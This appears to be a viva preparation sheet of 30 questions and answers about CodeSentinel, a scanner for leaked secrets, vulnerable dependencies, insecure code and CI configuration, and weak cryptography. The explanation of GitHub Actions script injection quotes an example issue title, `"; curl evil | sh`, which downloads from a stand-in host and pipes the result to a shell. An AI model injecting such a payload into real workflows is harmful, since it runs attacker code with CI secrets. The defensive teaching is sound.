# Viva preparation: 30 likely questions with answers

Numbers quoted below come from `docs/EVALUATION.md`.

---

### Motivation and prioritisation

**1. What problem does CodeSentinel solve, in one sentence?**
It decides whether a build is safe to ship by finding leaked secrets (including in git history), vulnerable dependencies ranked by real-world exploitation, insecure code and CI configuration, and weak cryptography, then gives one explainable grade and a pass/fail gate with SBOM, CBOM and SARIF outputs.

**2. Why not just use CVSS to prioritise vulnerabilities?**
CVSS measures how severe a vulnerability *would be* if exploited, not how likely exploitation is. Most CVEs are never exploited, so CVSS-only triage spends effort on theoretical issues. In our demo, a CVSS-only ranking puts the libwebp CVE-2023-4863 (CVSS 8.8) 23rd, behind 22 higher-scored issues, yet it is in CISA KEV with an EPSS of about 1.0; CodeSentinel ranks it third.

**3. What are EPSS and KEV, and how do they differ?**
EPSS (FIRST) is a daily machine-learning *prediction*: the probability a CVE is exploited in the next 30 days, with a percentile. KEV (CISA) is *evidence*: a curated list of CVEs already exploited in the wild, with remediation due dates. KEV is small and authoritative, so membership means "patch now"; EPSS covers every CVE and ranks the rest.

**4. How exactly is P0 defined?**
Any one of: a dependency CVE in KEV; CVSS ≥ 9.0 and EPSS ≥ 0.10; a live-format, non-placeholder secret in HEAD; or a SQL/command injection reached by user input (taint-confirmed). These are cases where exploitation is known, likely, or trivially possible.

**5. Why those thresholds (9.0 and 0.10)?**
CVSS 9.0 is the start of the "critical" band. An EPSS of 0.10 means a 10% chance of exploitation in 30 days, which puts a CVE in roughly the top few percent of all scored CVEs. Requiring both keeps P0 small enough to act on immediately. The thresholds are configurable constants and are documented in the UI and README so they can be challenged.

**6. Explain the risk formula.**
risk = severity_weight × (1 + 4·EPSS + 2 if KEV) × exposure. Severity weights are 10/6/3/1/0.25. Exploit likelihood can multiply risk by up to 7 (EPSS 1.0 + KEV). Exposure discounts transitive dependencies (0.6), history-only secrets (0.5) and test files (0.3). The repository score is 100 − min(100, Σrisk/10), mapped to A–F. Log4Shell, for example, scores 10 × (1 + 4 × 1.0 + 2) × 1.0 = 70.

### Secrets

**7. How does the entropy detector work? Show the maths.**
Shannon entropy H = −Σ pᵢ log₂ pᵢ over the character frequencies of a string, in bits per character. "aaaa" has H = 0; a random base64 string approaches log₂64 = 6; random hex approaches log₂16 = 4. We flag quoted strings of length ≥ 20 with H ≥ 4.3 (base64 alphabet) or ≥ 3.0 (hex), and only when the line contains a credential keyword, because entropy alone also matches hashes and IDs.

**8. Why are the hex and base64 thresholds different?**
The maximum possible entropy depends on alphabet size: 4 bits/char for hex, 6 for base64. A threshold of 4.3 is impossible for hex, so hex needs its own lower threshold (3.0, about 75% of maximum).

**9. Why does history scanning matter if the secret was deleted?**
Git keeps every version. Anyone with a clone or fork, or anyone who scraped the repository when it was public, can still read the old commit. Deleting the line does not revoke the credential. GitGuardian found about 70% of secrets leaked in 2022 were still valid later. Our demo commits AWS and Stripe keys, then removes them in a "Remove secrets" commit; CodeSentinel still reports them with the commit SHA and date.

**10. How is the history scanned efficiently?**
One streamed `git log -p --unified=0 --diff-filter=AM -n 500` call. Only added lines are examined, with file and line numbers taken from the hunk headers. Hits are de-duplicated by SHA-256 fingerprint against HEAD: if the secret is still in HEAD it is reported once (annotated with the commit that introduced it); otherwise it becomes a "historical" finding pinned to the oldest commit that added it.

**11. How do you avoid storing secrets?**
The raw value exists only inside the detector. A finding stores a SHA-256 fingerprint (for de-duplication and diffs) and a redacted preview (first 4 + `****` + last 4, less for short values). Every code snippet from every module goes through a redaction pass. Tests and the evaluation grep the database, all exports, logs and rendered pages for each planted secret; none is found.

**12. Why not check whether a leaked key still works?**
Using a credential you do not own, even a publicly leaked one, is unauthorised access. Validation also sends the secret to a third party. CodeSentinel never calls provider APIs; consent-based validation for an organisation's own estate is listed as future work.

**13. How do you handle false positives in secret detection?**
Layered controls: skip lockfiles, minified files, binaries, vendored directories and files over 1 MB; require keyword context for entropy; exclude SRI hashes, UUIDs, paths, identifiers, UI-label keys and single dictionary words; restrict translation files to provider signatures; downgrade documentation placeholders (such as `AKIAIOSFODNN7EXAMPLE`) to info rather than dropping them; support an inline `codesentinel:ignore`; and support policy-file suppressions with justification and expiry. Testing on Juice Shop cut its secret findings from 116 to 41 genuine ones after these rules were added.

### Dependencies and standards

**14. Walk through what happens to a single dependency.**
`Pillow==8.0.0` in `requirements.txt` becomes the component `pkg:pypi/pillow@8.0.0`. OSV `querybatch` returns its advisory IDs; each advisory is fetched for aliases, CVSS vectors and affected ranges. Aliases (PYSEC + GHSA) are merged into one finding per vulnerability. The CVSS score is computed from the vector, EPSS and KEV are looked up by CVE, the smallest fixed version above 8.0.0 is computed from the ranges, and the upgrade command is generated: `pip install "pillow>=10.0.1"`. CVE-2023-4863 is in KEV, so it is P0.

**15. How do you tell direct from transitive dependencies?**
From the lockfile structure: npm v2/v3 lockfiles list the root's dependencies under `packages[""]`; v1 uses nesting plus `package.json`; Poetry and Pipenv use `pyproject.toml`/`Pipfile`; Go marks `// indirect`. Transitive findings get a 0.6 exposure factor and an override-style upgrade command, because you usually fix them by upgrading the parent.

**16. What is an SBOM, and what is a CBOM? How do they differ?**
An SBOM lists software components (name, version, PURL, licence, relationships) so you can answer "where do we use Log4j?" in minutes. A CBOM lists cryptographic assets (algorithms, modes, key sizes, curves, protocols) and where they occur, so you can answer "where do we use RSA-1024 or anything quantum-vulnerable?". Both are CycloneDX 1.6 documents; the CBOM uses `cryptographic-asset` components with `cryptoProperties`.

**17. Why does the CBOM flag RSA and ECC as quantum-vulnerable even when they are "approved"?**
Shor's algorithm on a large quantum computer breaks RSA, DSA, DH and elliptic-curve cryptography. They are safe today but data encrypted now can be harvested and decrypted later. Flagging them supports migration planning to NIST's post-quantum standards (FIPS 203/204/205), which is the intent of CERT-In BOM v2.0's CBOM/QBOM scope.

**18. What is SARIF, and why emit it?**
The Static Analysis Results Interchange Format 2.1.0 is an OASIS standard JSON format for analysis results. GitHub code scanning, Azure DevOps and many IDEs consume it. Emitting SARIF means CodeSentinel's findings appear natively in the GitHub Security tab, with rule help, CWE tags, severity and stable fingerprints for de-duplication across runs.

**19. What regulations make this relevant in India?**
CERT-In's Technical Guidelines on SBOM (October 2024) and BOM Guidelines v2.0 (July 2025), which add CBOM/QBOM/AIBOM/HBOM, and SEBI's CSCRF (August 2024), which requires SBOMs for core and critical software at regulated entities.

### Static analysis

**20. Why use the AST for Python instead of regular expressions?**
Regexes cannot tell code from comments or strings, cannot follow variables, and cannot see that a query is a constant. With the AST we resolve imports and aliases, know which argument is the SQL text, and track which variables hold user input. That is how we flag `cur.execute(f"... {term}")` as a tainted P0 while ignoring `cur.execute("... WHERE id = ?", (pid,))`, one of our decoys.

**21. How does your taint tracking work, and what are its limits?**
Within each function, variables assigned from sources (`request.args/form/json/...`, `input()`, `sys.argv`, route parameters) are tainted, and taint propagates through any expression that mentions a tainted name. When a sink receives a tainted argument, the finding is marked tainted and raised in severity. It is intra-procedural: it does not follow values into other functions or files, and it does not model sanitisers. Inter-procedural taint is future work.

**22. Then why is JavaScript analysed with tokens rather than an AST?**
A proper JS/TS parser would add a Node toolchain or a heavy dependency, which the "no build step" constraint rules out. A comment-aware tokenizer plus targeted patterns catches the common sinks (eval, exec with templates, innerHTML, SQL templates, jwt.verify without algorithms) with line-accurate results. The trade-off is lower precision on unusual code; we accept it and document it.

### CI/CD and the gate

**23. What was the tj-actions incident, and how does CodeSentinel help?**
In March 2025 (CVE-2025-30066) attackers changed the version tags of `tj-actions/changed-files`, used by more than 23,000 repositories, to point at code that dumped CI secrets into build logs. Workflows referencing `@v35` silently ran the malicious code; those pinned to a full commit SHA did not. CodeSentinel flags third-party actions not pinned to a 40-character SHA, and its own workflow pins every action.

**24. What is a "pwn request" and script injection in GitHub Actions?**
`pull_request_target` runs with the base repository's secrets and a write token; if the workflow then checks out the PR's head commit and builds it, an attacker's PR runs with those privileges. Script injection happens when untrusted text such as `${{ github.event.issue.title }}` is interpolated into a `run:` shell. A title like `"; curl evil | sh` executes. The fix is to pass it via `env:` and quote it, which CodeSentinel recognises as safe.

**25. How does the gate work in CI, and how do teams handle accepted risk?**
`python -m codesentinel scan . --fail-on p0` exits 1 when any open finding is at or above the threshold, which fails the job; SARIF is uploaded regardless. Accepted risk goes in `.codesentinel.yml` with a mandatory justification and expiry date (expired entries resurface automatically) or is triaged in the UI with a justification; both re-evaluate the gate.

### Evaluation, limitations, ethics, scale

**26. How did you evaluate accuracy, and what were the results?**
Against a generated ten-commit repository with 56 labelled issues (39 code-level and 17 vulnerable packages) and 3 decoys, matched by rule, file and line. Precision, recall and F1 were 1.00 in every module and no decoy was flagged. On real repositories we have no ground truth, so we reported volumes and manually verified every P0: PyGoat's taint-confirmed SQLi/command injection and KEV-listed Pillow CVE, and Juice Shop's committed Terraform private key.

**27. Isn't a perfect score on your own test repository suspicious?**
Yes, and the report says so. The ground truth was written alongside the rules, so it shows each rule fires where intended and stays quiet on the decoys; it does not measure performance on arbitrary code. That is why we also scanned two independent real projects. Juice Shop exposed real false positives (translation strings) and a performance bug (90 s regex backtracking), both of which were fixed and re-measured.

**28. What are the main limitations?**
No reachability analysis (every advisory on an installed version is reported even if the vulnerable function is never called); intra-procedural taint only; token-based JS analysis; no SAST for Go, Java or Rust source; `package.json` without a lockfile resolves ranges to their minimum version; Dockerfiles are audited as text, not image layers; the in-process rate limiter and thread pool assume a single server instance.

**29. What ethical safeguards are built in?**
Scan only code you own or are authorised to assess; secrets are never validated or stored in full; scanned code is never executed; clones are deleted; the hosted image disables local-path scanning; demo credentials are fake values derived at runtime so the project's own repository contains none; findings in third-party projects should go through responsible disclosure.

**30. How would this scale in a company with thousands of repositories?**
Run the CLI in every pipeline (already supported) and send results to a central service. For the server: replace SQLite with PostgreSQL (`CS_DATABASE_URL`), move scans to a distributed queue (Celery/RQ/Kubernetes jobs), share the threat-intel cache across workers (the TTL cache design already avoids repeated feed calls), add organisation-level dashboards and ownership mapping, push findings into ticketing systems, schedule nightly rescans because EPSS and KEV change daily even when code does not, and add reachability analysis to cut noise further.
